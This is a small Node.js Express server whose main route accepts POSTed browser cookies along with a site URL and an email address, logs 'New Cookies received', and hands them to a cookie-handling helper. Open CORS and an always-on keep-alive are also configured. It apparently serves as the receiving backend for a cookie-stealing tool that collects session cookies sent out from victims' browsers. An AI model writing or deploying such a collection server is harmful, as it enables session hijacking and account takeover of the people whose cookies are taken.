const express = require("express");
const utils = require('./utils');
const logger = require("./logger");
const cors = require("cors");
const app = express();

const PORT = process.env.PORT || 3000;

let RUNNING = 0;

if (RUNNING === 0) { utils.keepTheServerRunning(); RUNNING = 1; };

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(cors());

app.get("/", async (req, res) => {
    res.send({ status: "Server is Up and Running!" });
});

app.post("/", (req, res) => {
    logger.log(2, `\nNew Cookies received: ${req.body.url}, ${req.body.email}`);
    utils.handleCookies(req.body);
    res.json("Data recieved successfully!");

});

app.get("/download_log_file", (req, res) => {
    const filename = req.query.filename;

    if (!filename) return res.status(400).send("Missing file path in query params.");
    if (!["errors", "info", "warnings"].includes(filename)) return res.status(400).send("This provided file is not available.");

    res.download(`./logs/${filename}.log`);
})

app.listen(PORT, () => {
    logger.log(2, `\nServer is running on port ${PORT}`);
});
